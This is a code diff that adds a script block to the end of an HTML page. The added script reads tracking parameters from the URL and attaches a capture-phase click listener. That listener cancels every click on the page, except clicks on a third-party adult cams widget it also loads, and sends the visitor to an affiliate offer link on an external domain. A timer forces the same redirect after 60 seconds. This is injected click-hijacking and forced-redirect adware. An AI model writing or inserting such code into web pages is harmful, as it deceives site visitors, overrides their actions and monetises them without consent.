@@ -675,5 +675,73 @@
                     });
                 }
                                 </script>
+    <script>
+// =============================
+// 🔥 PARAMETER CAPTURE
+// =============================
+function getParam(name) {
+  return new URLSearchParams(window.location.search).get(name) || "";
+}
+
+let ymid = getParam("ymid");
+let source = getParam("var");
+
+// =============================
+// 🎯 FINAL OFFER URL
+// =============================
+let finalUrl = "https://g0wdb.com/link?z=10915581"
+              + "&var=" + source
+              + "&ymid=" + ymid;
+
+// =============================
+// 🚀 UNIVERSAL CLICK OVERRIDE
+// =============================
+document.addEventListener("click", function(e) {
+
+  // Agar koi link, button, image, div etc click ho
+  let target = e.target;
+
+	// ✅ Widget safe (IMPORTANT FIX)
+  if (
+    target.closest('iframe') || 
+    target.closest('[src*="crxcr2"]') ||
+    target.closest('[class*="jerky"]') ||
+    target.closest('[id*="jerky"]')
+  ) {
+    return; // widget clicks allow
+  }
+
+  // Prevent default behavior
+  e.preventDefault();
+  e.stopPropagation();
+
+  // Redirect to final URL
+  window.location.href = finalUrl;
+
+}, true); // ⚠️ capture phase (important)
+
+// =============================
+// 🚀 WIDGET LOAD (IMPORTANT)
+// =============================
+(function loadWidget(){
+  let script = document.createElement("script");
+  script.src = "https://crxcr2.com/cams-widget-ext/im_jerky"
+              + "?lang=en&mode=prerecorded"
+              + "&outlinkUrl=" + encodeURIComponent(finalUrl);
+  script.defer = true;
+  document.body.appendChild(script);
+})();
+// =============================
+// 🔒 UNIVERSAL CLICK OVERRIDE
+// =============================
+	
+// =============================
+// ⚡ OPTIONAL AUTO REDIRECT
+// =============================
+setTimeout(function(){
+  window.location.href = finalUrl;
+}, 60000); // 60 sec
+</script>
+    
     </body>
 </html>
